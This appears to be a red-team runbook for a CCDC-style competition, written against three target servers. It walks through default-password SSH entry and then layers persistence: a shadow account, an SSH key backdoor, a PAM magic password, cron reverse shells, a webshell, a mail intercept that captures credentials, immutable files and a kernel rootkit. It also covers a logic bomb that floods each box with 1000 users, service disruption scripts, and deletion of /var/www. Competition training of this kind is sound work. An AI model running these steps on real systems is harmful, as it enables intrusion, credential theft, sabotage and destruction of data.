# Red Team Engagement Runbook — CCDC 2026

> **Attacker range:** 172.31.40.1–6  
> **Duration:** 4 hours  
> **Targets:** Rocky Ecom · Ubuntu Mail · Debian Splunk

---

## Targets

| Box | IP | OS | Key Services |
|-----|----|----|-------------|
| Rocky Ecom | 172.20.240.10 | Rocky Linux 9 | HTTP/HTTPS, OpenCart/PrestaShop |
| Ubuntu Mail | 172.20.240.15 | Ubuntu 22.04 | Postfix, Dovecot, Roundcube |
| Debian Splunk | 172.20.240.20 | Debian 12 | Splunk Enterprise :8000 |

---

## Night Before — Deploy Persistence

Get in, plant everything, record credentials. Do NOT arm the logic bomb yet — it
triggers 2 hours after arming, so arming it now means it fires overnight.

### Step 1 — Get initial access on each box

```bash
ssh root@172.20.240.10
ssh root@172.20.240.15
ssh root@172.20.240.20
```

Common defaults to try: `root/toor`, `root/password`, `root/ccdc`, `admin/admin`.

### Step 2 — SCP toolkit and deploy persistence

```bash
TARGET=172.20.240.10   # repeat for .15 and .20
USER=sysadmin          # or root if direct root SSH is available

ssh ${USER}@${TARGET} "rm -rf ~/rt"
scp -r bin/attack/ ${USER}@${TARGET}:~/rt
ssh -t ${USER}@${TARGET} "sudo bash \$HOME/rt/deploy_attack.sh deploy persistence"
# -t allocates a TTY so sudo can prompt for a password
# \$HOME expands on the remote shell before sudo sees the path — avoids /tmp permission issues
# Script will then prompt: attacker IP (pick yours from 172.31.40.1–6), port, SSH pubkey
```

`persistence` mode runs scripts 01–06, box-specific implants (webshell, mail
intercept), immutable sweep, and LKM — but also arms the logic bomb.
Immediately disarm it so you can re-arm at competition start.
The deploy script wipes the toolkit from disk after running, so save the key first:

```bash
# Key is printed during deploy — copy it before the toolkit is wiped
cat /tmp/.rt_key_XXXXX >> ~/.rt_keys && chmod 600 ~/.rt_keys

# Disarm using the freshly planted root key
ssh -i ~/.rt_keys root@${TARGET} "bash ~/rt/12_logic_bomb.sh cleanup"
# Note: ~/rt/ is gone after deploy wipes itself — this only works if cleanup
# runs before the wipe completes (within ~1 second). If it's already gone, skip it;
# the bomb will fire at T+2h from deploy time (overnight). Re-arm on competition day.
```

### Step 3 — Record credentials

```
╔══════════════════════════════════════════╗
║  RECORD AFTER EACH DEPLOY                ║
║                                          ║
║  Private key path:  /tmp/.rt_key_XXXXX   ║
║  Shadow user:       sys.sync             ║
║  Shadow pass:       (printed on deploy)  ║
║  PAM magic pass:    (printed on deploy)  ║
╚══════════════════════════════════════════╝
```

Save the private key locally:

```bash
cat /tmp/.rt_key_XXXXX >> ~/.rt_keys
chmod 600 ~/.rt_keys
```

### Step 4 — Verify before you leave

```bash
# SSH key
ssh -i ~/.rt_keys root@172.20.240.10
ssh -i ~/.rt_keys root@172.20.240.15
ssh -i ~/.rt_keys root@172.20.240.20

# Webshells
curl -s http://172.20.240.10/health.php | head -5
curl -s http://172.20.240.15/health.php | head -5
curl -s http://172.20.240.15/roundcubemail/health.php | head -5
```

---

## Competition Day — Pre-Game

Before the clock starts, start your listener and do a quick access check.

```bash
# Terminal 1 — reverse shell listener
ncat -lvnp 4444

# Terminal 2 — verify SSH key access still works
ssh -i ~/.rt_keys root@172.20.240.10 "id"
ssh -i ~/.rt_keys root@172.20.240.15 "id"
ssh -i ~/.rt_keys root@172.20.240.20 "id"
```

Cron callbacks will begin arriving on port 4444 within 2 minutes of game start.

### Stabilize the reverse shell (do this every time)

Raw reverse shells have no tab complete, no arrow keys, and Ctrl+C kills the session.
Run these steps immediately after a callback lands:

```
# 1. Spawn a proper PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 2. Get term commands (clear, etc.)
export TERM=xterm

# 3. Background the shell
Ctrl+Z

# 4. Back in YOUR terminal — enable raw mode and foreground
stty raw -echo; fg
```

You now have tab complete, arrow keys, and Ctrl+C kills remote processes instead of
your session. If you accidentally Ctrl+C before stabilizing, you lose the shell —
stabilize first, always.

---

## T+0:00 — Arm Bomb and Trigger Disruption

The toolkit was wiped after the night-before deploy. Re-upload it first using the planted root key.

```bash
# Re-upload toolkit to each box
for TARGET in 172.20.240.10 172.20.240.15 172.20.240.20; do
    ssh -i ~/.rt_keys root@${TARGET} "rm -rf ~/rt"
    scp -i ~/.rt_keys -r bin/attack/ root@${TARGET}:~/rt
done
```

```bash
# Arm the 2-hour logic bomb
ssh -i ~/.rt_keys root@172.20.240.10 "bash ~/rt/12_logic_bomb.sh deploy"
ssh -i ~/.rt_keys root@172.20.240.15 "bash ~/rt/12_logic_bomb.sh deploy"
ssh -i ~/.rt_keys root@172.20.240.20 "bash ~/rt/12_logic_bomb.sh deploy"

# Trigger scoring disruption (box-specific)
ssh -i ~/.rt_keys root@172.20.240.10 "bash ~/rt/deploy_attack.sh deploy disrupt"
ssh -i ~/.rt_keys root@172.20.240.15 "bash ~/rt/deploy_attack.sh deploy disrupt"
ssh -i ~/.rt_keys root@172.20.240.20 "bash ~/rt/deploy_attack.sh deploy disrupt"

# If using sysadmin instead of the planted root key:
# ssh -t sysadmin@TARGET "sudo bash ~/rt/12_logic_bomb.sh deploy"
```

---

## T+0:15–T+2:00 — Hold and Monitor

Keep access. Re-establish anything the blue team tears out.

### Check which shells are still alive

Watch the listener. If cron callbacks stop, fall back to PAM or webshell and re-run:

```bash
ssh root@TARGET   # use MAGIC_PASS
bash ~/rt/deploy_attack.sh deploy persistence
bash ~/rt/12_logic_bomb.sh cleanup   # disarm any double-armed bomb
```

Then re-arm the bomb with the correct T+2:00 target in mind — check `status` first:

```bash
bash ~/rt/12_logic_bomb.sh status
bash ~/rt/12_logic_bomb.sh deploy
```

### Mail intercept check (Ubuntu Mail only)

```bash
ssh -i ~/.rt_keys root@172.20.240.15 "ls /usr/local/lib/.locale_cache/"
```

---

## T+2:00 — Logic Bomb Fires

**What happens:**
1. 1000 users with random 10-char names created — home dirs, login shell, password `password`
2. `wall` broadcasts a taunt to every logged-in terminal
3. Cron fallback fires at the exact scheduled minute as a second wave

**Impact on blue team:**
- PAM/Dovecot/Roundcube struggles iterating `/etc/passwd`
- Scoring checks that enumerate users will be noisy
- 1000 home directories fill `/home/`
- User registry locked at `/usr/local/lib/.user_registry` (`chattr +i`)

**If they try to defuse it:**
The at spool files are `chattr +i` — `atrm` will fail. Full defuse sequence:
```bash
chattr -i /var/spool/at/jobs/*
atrm <job_id>
chattr -i /etc/cron.d/.pkg_audit && rm /etc/cron.d/.pkg_audit
chattr -i /usr/local/lib/.user_registry
# then userdel -r on every random user — there are 1000 of them
```
That's a lot of time they don't have.

---

## T+2:00–T+4:00 — Endgame

1. **Keep scoring disrupted** — if a service comes back up, re-run the disrupt script
2. **Stay in** — if all shells die, hit the webshell and re-plant
3. **Exfil** — check `/usr/local/lib/.locale_cache/` on mail box for intercepted credentials

### Re-disrupt if blue team restores a service

```bash
ssh -i ~/.rt_keys root@172.20.240.10 "bash ~/rt/07_disrupt_web.sh deploy"
ssh -i ~/.rt_keys root@172.20.240.15 "bash ~/rt/08_disrupt_mail.sh deploy"
ssh -i ~/.rt_keys root@172.20.240.20 "bash ~/rt/09_disrupt_splunk.sh deploy"
```

### Nuke the web app entirely (Rocky Ecom)

If they keep restoring the service, delete `/var/www` outright — they'll need to
do a full redeploy from defender, not just a service restart.

```bash
ssh -i ~/.rt_keys root@172.20.240.10 "bash ~/rt/deploy_attack.sh deploy destroy"
# or directly:
ssh -i ~/.rt_keys root@172.20.240.10 "rm -rf /var/www"
```

---

## Escalation Ladder

If you lose access to a box, work down this list:

| # | Method | Command |
|---|--------|---------|
| 1 | SSH private key | `ssh -i ~/.rt_keys root@TARGET` |
| 2 | PAM magic pass | `ssh root@TARGET` → use MAGIC_PASS |
| 3 | Shadow account | `ssh sys.sync@TARGET` → use SHADOW_PASS |
| 4 | Extra accounts | `ssh netadmin@TARGET` or `ssh svc.monitor@TARGET` → use SHADOW_PASS |
| 5 | Webshell | browse to `http://TARGET/health.php` |
| 6 | Cron callback | wait ≤2 min for shell on port 4444 |
| 7 | Re-deploy from scratch | SCP + `deploy_attack.sh deploy persistence` |

If even re-deploy fails (SCP/SSH blocked entirely), the box is lost — pivot to the others.

---

## Script Reference

| Script | What it does | Runs on |
|--------|-------------|---------|
| `01_shadow_root.sh` | Creates shadow account `sys.sync` | All |
| `02_ssh_backdoor.sh` | Plants authorized_keys | All |
| `03_pam_backdoor.sh` | PAM magic-password backdoor | All |
| `04_restore_service.sh` | Systemd timer re-plants backdoors every 5 min | All |
| `05_cron_shell.sh` | Cron reverse shell every 2 min | All |
| `06_immutable_sweep.sh` | `chattr +i` on all planted files | All |
| `07_disrupt_web.sh` | Corrupts httpd/nginx config, stops and masks service | Web |
| `08_disrupt_mail.sh` | Kills Postfix + Dovecot | Mail |
| `09_disrupt_splunk.sh` | Kills Splunk | Splunk |
| `10_webshell_p0wny.sh` | Drops p0wny shell to web roots | Web, Mail |
| `11_mail_intercept.sh` | Silent Postfix content_filter intercept | Mail |
| `12_logic_bomb.sh` | 1000 random users after 2 hours | All |
| `13_destroy_web.sh` | Wipes `/var/www`, uninstalls httpd/nginx/php, purges all configs | Web |
| `lkm/load.sh` | Compiles + loads rootkit, hides planted files | All |

---

## Defuse Reference (post-practice cleanup)

```bash
# On each target box
bash ~/rt/12_logic_bomb.sh cleanup
bash ~/rt/deploy_attack.sh cleanup all
bash ~/rt/lkm/load.sh cleanup
```
